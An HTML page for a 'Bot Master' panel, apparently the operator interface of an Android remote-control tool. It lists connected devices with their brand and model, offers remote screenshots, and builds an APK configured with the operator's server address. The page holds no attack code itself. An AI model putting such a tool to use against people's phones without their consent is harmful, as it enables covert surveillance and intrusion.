<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Master</title>

    <!-- FONTS -->


    <!-- CSS -->
    <link rel="stylesheet" href="../css/index.css">
    <link rel="stylesheet" href="../css/nice-select.css">


    <!-- JS -->
    <script src="../js/socketIo.js" defer></script>
    <script src="../js/jquery.js" defer></script>
    <script src="../js/jquery.nice-select.min.js" defer></script>
    <script src="../js/index.js" defer></script>

</head>
<body>
    <div id="mainBody">
        <header>
            <img src="../img/cyber-eye.png" alt="">
            <p>BOT MASTER</p>
        </header>
        <div id="container">
            <form id="left">
                <div id="leftBG"></div>
                <div id="options" class="backdrop-container">
                    <div style="padding: 1rem 1rem 0 1rem;background-color: #ffffff;border-radius: 5px 5px 0 0;">
                        <select name="devices" id="devices" class="wide" onchange="getInfo(this.value)">
                            <option data-display="Devices">None</option>
                        </select>
                    </div>
                    <div id="infos">
                        <div class="info">
                            <span>Brand :</span>
                            <span>--</span>
                        </div>
                        <div class="info">
                            <span>Model :</span>
                            <span>--</span>
                        </div>
                        <div class="info">
                            <span>Manufacture :</span>
                            <span>--</span>
                        </div>
                        <div class="device-action">
                            <div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot">
                                <img src="../img/screenshot.png" alt="Take Screenshot">
                                <span>Take Screenshot</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section-container">
                    <p class="section-title">
                        Build APK
                        <span class="info-icon" title="Build a custom APK configured with your WebSocket server details. Enter your server's IP address or domain to establish the connection between the Android client and your control server.">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="12" cy="12" r="10"></circle>
                                <path d="M12 16v-4"></path>
                                <path d="M12 8h.01"></path>
                            </svg>
                        </span>
                    </p>
                    <input type="text" id="ipInput" placeholder="" value="">
                    <div class="button-container">
                        <div class="section-apk-inline" onclick="download()" title="Build and Download APK">
                            <img src="../img/download.svg" alt="Build and Download APK">
                            <span>Build APK</span>
                        </div>
                    </div>
                </div>
                <div class="section-container">
                    <div class="button-container">
                        <div class="section-apk-inline" onclick="downloadLatest()" title="Download APK">
                            <img src="../img/download.svg" alt="Download APK">
                            <span>Download APK</span>
                        </div>
                    </div>
                </div>
            </form>
            <div id="right">
                <textarea name="output" spellcheck="false" id="output" disabled></textarea>
            </div>
        </div>
    </div>
    <div id="msgs">
    </div>
</body>
</html>
